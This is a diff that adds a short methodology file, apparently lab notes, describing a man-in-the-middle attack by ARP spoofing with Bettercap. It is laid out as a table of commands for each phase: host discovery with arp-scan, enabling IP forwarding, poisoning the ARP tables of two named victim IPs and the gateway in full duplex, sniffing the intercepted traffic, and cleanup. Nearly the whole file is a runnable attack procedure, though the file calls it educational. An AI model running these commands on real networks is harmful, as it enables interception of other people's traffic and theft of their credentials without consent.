@@ -1,0 +1,28 @@
+Methodology: Man-in-the-Middle (ARP Spoofing) Attack
+
+Performed in a controlled lab environment for educational purposes.
+
+Phase 1 : Host Configuration & Reconnaissance
+Step	                         Command	Purpose
+1	ip a	                    : Identify the local network interfaces and the attacking machine's IP address.
+2	ip route  	              : Display the routing table to determine the default gateway.
+3	sudo arp-scan --localnet	: Scan the local subnet to enumerate live hosts and their MAC addresses (target discovery).
+Phase 2 : Preparing the Attack
+Step	Command	Purpose
+4	sudo sysctl -w net.ipv4.ip_forward=1	: Enable IP forwarding so intercepted traffic is relayed to its destination, keeping the victim's connection alive.
+Phase 3 : Launching Bettercap
+Step	                          Command	Purpose
+5	sudo bettercap -iface eth0 : Start Bettercap on the eth0 interface.
+6	net.probe on	             : Actively probe the network to populate the host list.
+7	net.show	                 : Display discovered hosts, IPs, and MAC addresses to confirm targets.
+Phase 4 : ARP Spoofing
+Step	                                                 Command	Purpose
+8	set arp.spoof.targets 10.73.147.200,10.73.147.181	: Define the victim host(s) to be spoofed.
+	set arp.spoof.fullduplex true	:                     Spoof both the targets and the gateway so traffic is intercepted in both directions.
+	arp.spoof on	:                                     Begin the ARP poisoning attack.
+Phase 5 : Traffic Interception
+Step            	Command	Purpose
+9	net.sniff on	: Capture and inspect the traffic now flowing through the attacking machine.
+Phase 6 : Cleanup
+Step              	Command	Purpose
+10	arp.spoof off	: Stop the attack and restore the correct ARP table entries on the targets.
